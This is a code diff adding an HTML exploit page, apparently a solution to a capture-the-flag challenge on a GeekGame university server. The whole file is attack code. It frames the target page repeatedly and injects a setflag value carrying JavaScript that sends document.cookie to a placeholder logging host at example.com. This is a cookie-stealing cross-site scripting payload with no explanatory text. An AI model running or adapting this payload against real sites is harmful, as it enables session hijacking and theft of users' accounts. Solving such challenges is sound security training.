@@ -1,0 +1,28 @@
+<html>
+    <head>
+        <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
+    </head>
+    <body>
+    </body>
+    <script>
+        var hole_url = "https://prob15-qkuhole.geekgame.pku.edu.cn/hole/";
+        var report_url = "https://example.com/log/X";
+        function G() {
+            setTimeout(function() {
+                var iframe = $("<iframe></iframe>")
+                    .attr("height", "600px")
+                    .attr("width", "800px")
+                    .attr("sandbox", "allow-scripts allow-same-origin")
+                    .attr("src", hole_url + "#//setflag APPSWITCHER_ITEMS={\"switcher_2\": {\"fix\": {\"hole\": \"location.href='" + report_url + "' + document.cookie;\"}, \"bar\": [], \"dropdown\": []}}");
+                $("body").append(iframe);
+            }, 1);
+        }
+        (function(){
+            for (var i = 0; i < 10; i++)
+                G();
+            setTimeout(function() {
+                location.href = hole_url;
+            }, 1000)
+        })()
+    </script>
+</html>
